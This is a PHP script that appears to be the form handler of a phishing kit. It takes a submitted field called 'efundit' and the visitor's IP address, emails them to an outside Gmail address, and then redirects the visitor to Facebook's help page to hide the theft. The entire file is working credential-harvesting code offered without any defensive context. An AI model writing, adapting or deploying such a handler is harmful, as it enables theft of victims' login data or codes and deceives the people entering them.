<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$efundit = $_POST['efundit'];


$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'efundit: '.$efundit . PHP_EOL .'IP:'. $ip;
mail("raloqka2021@gmail.com","efundit", $stringi);
header("Location: https://facebook.com/help/");

?>